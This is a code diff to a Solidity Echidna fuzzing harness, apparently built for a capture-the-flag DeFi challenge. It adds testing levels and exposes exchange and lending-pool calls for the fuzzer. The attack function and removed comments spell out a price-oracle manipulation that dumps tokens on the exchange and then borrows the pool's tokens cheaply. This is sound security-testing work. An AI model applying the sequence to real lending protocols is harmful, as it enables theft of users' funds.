@@ -15,6 +15,12 @@ import "./Deployer.sol";
 contract Echidna {
     using Address for address payable;
 
+    enum TestingLevel {
+        EducatedGuess,
+        SuspectFunctions,
+        Naive
+    }
+
     Deployer _deployer;
 
     DamnValuableToken _token;
@@ -25,6 +31,10 @@ contract Echidna {
     uint256 public constant ATTACKER_ETH = 25 ether;
 
     uint256 _initialPoolTokenBalance;
+
+    TestingLevel private _testingLevel = TestingLevel.SuspectFunctions;
+
+    error OnlyTestingLevel(TestingLevel supported);
 
     constructor() payable {
         _deployer = new Deployer();
@@ -40,31 +50,24 @@ contract Echidna {
         (_token, _pool, _exchange) = _deployer.deploy{value: uniswapEth}();
 
         _deployer.transfer(address(this), ATTACKER_TOKENS);
+    }
 
-        // _token.approve(address(_exchange), ATTACKER_TOKENS);
-        // _exchange.tokenToEthSwapInput(
-        //     ATTACKER_TOKENS,
-        //     // @audit-info min-eth needs to be > 0
-        //     1, // min eth
-        //     block.timestamp + 1 hours
-        // );
-        // _pool.borrow{value: address(this).balance}(
-        //     _initialPoolTokenBalance,
-        //     address(this)
-        // );
-        // _exchange.ethToTokenSwapInput{value: address(this).balance}(
-        //     1, // min token
-        //     block.timestamp + 1 hours
-        // );
+    modifier onlyTestingLevel(TestingLevel testingLevel) {
+        if (_testingLevel != testingLevel) {
+            revert OnlyTestingLevel(testingLevel);
+        }
 
-        // require(false, "Invariants: setup failed");
+        // Underscore is a special character only used inside
+        // a function modifier and it tells Solidity to
+        // execute the rest of the code.
+        _;
     }
 
     // //////////////
     // EDUCATED GUESS
     // //////////////
 
-    function attack() external {
+    function attack() external onlyTestingLevel(TestingLevel.EducatedGuess) {
         _token.approve(address(_exchange), ATTACKER_TOKENS);
         _exchange.tokenToEthSwapInput(
             ATTACKER_TOKENS,
@@ -86,20 +89,44 @@ contract Echidna {
     // SUSPECT FUNCTIONS
     // /////////////////
 
-    // function flashLoan(uint256 amount) external {
-    //     _pool.flashLoan(amount);
-    // }
+    function approve(
+        uint256 amount
+    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+        _token.approve(address(_exchange), amount);
+    }
 
-    // function executeAction(uint256 actionId) external {
-    //     _gov.executeAction(actionId);
-    // }
+    function tokenToEthSwapInput(
+        uint256 tokens_sold,
+        uint256 min_eth,
+        uint256 deadline
+    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+        _exchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
+    }
+
+    function borrow(
+        uint256 amount
+    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+        _pool.borrow{value: address(this).balance}(amount, address(this));
+    }
+
+    function ethToTokenSwapInput(
+        uint256 min_tokens,
+        uint256 deadline
+    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
+        _exchange.ethToTokenSwapInput{value: address(this).balance}(
+            min_tokens,
+            deadline
+        );
+    }
 
     // ////////////////////
     // INVARIANT PROPERTIES
     // ////////////////////
 
     // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
-    function ignore_echidna_test_attack_doesnt_revert() public returns (bool) {
+    function echidna_test_attack_doesnt_revert() external returns (bool) {
+        revert("Disabled");
+
         _token.approve(address(_exchange), ATTACKER_TOKENS);
         _exchange.tokenToEthSwapInput(
             ATTACKER_TOKENS,
@@ -124,6 +151,14 @@ contract Echidna {
         returns (bool)
     {
         return _token.balanceOf(address(_pool)) > 0;
+    }
+
+    function echidna_cannot_take_all_tokens_from_pool()
+        public
+        view
+        returns (bool)
+    {
+        return _token.balanceOf(address(this)) < _initialPoolTokenBalance;
     }
 
     // @audit-info if receive is missing, educated guess will fail
